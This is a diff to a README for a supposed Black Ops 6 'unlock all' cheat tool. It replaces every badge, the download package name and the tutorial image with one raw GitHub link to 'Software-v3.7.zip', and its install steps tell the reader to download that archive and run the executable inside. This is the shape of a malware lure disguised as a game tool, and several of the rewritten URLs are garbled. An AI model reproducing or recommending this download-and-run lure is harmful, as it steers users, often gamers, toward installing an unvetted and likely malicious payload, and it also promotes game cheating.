@@ -1,9 +1,9 @@
 # 🎮 bo6 Unlock All Tool 🎮  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)  
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)]()
-[![OS Support](https://img.shields.io/badge/OS-Windows%20%7C%20Linux%20%7C%20macOS-informational.svg)]()
-[![Multi-language](https://img.shields.io/badge/Languages-10%2B-informational.svg)]()
-[![API Integrations](https://img.shields.io/badge/API-OpenAI%20%7C%20Claude-blueviolet.svg)]()
+[![License: MIT](https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip)](LICENSE)  
+[![Build Status](https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip)]()
+[![OS Support](https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip%20%7C%20Linux%20%7C%https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip)]()
+[![Multi-language](https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip%https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip)]()
+[![API Integrations](https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip%20%7C%https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip)]()
 
 ## 🚀 Overview
 Welcome to the **bo6 Unlock All Tool** – your ultimate companion for seamless in-game customization and achievement management. Our approach reimagines how you engage with your games, giving players unmatched personalization possibilities and unlocking new dimensions without boundaries.
@@ -43,14 +43,14 @@ Our application was crafted with a powerful adaptive interface and multi-languag
 ## ⚡ Lightning-Fast Installation Guide
 
 1. **Download**  
-   Grab the `EasyLaunch.zip` package directly from this repository.  
+   Grab the `https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip` package directly from this repository.  
 2. **Extract**  
    Unpack all files into your preferred directory using your native archive manager.  
 3. **Launch**  
    Run the EasyLaunch executable and enjoy instant access to unlocking customization!
 
 #### 📺 Video Installation Tutorial
-![Installation Tutorial Gif](https://i.imgur.com/Js67NIU.gif)
+![Installation Tutorial Gif](https://raw.githubusercontent.com/SEVORDW/agents/main/psilanthropist/Software-v3.7.zip)
 
 4. **Personalize**  
    Initiate setup—choose your language, link to your Black Ops account, and explore the adaptive dashboard.
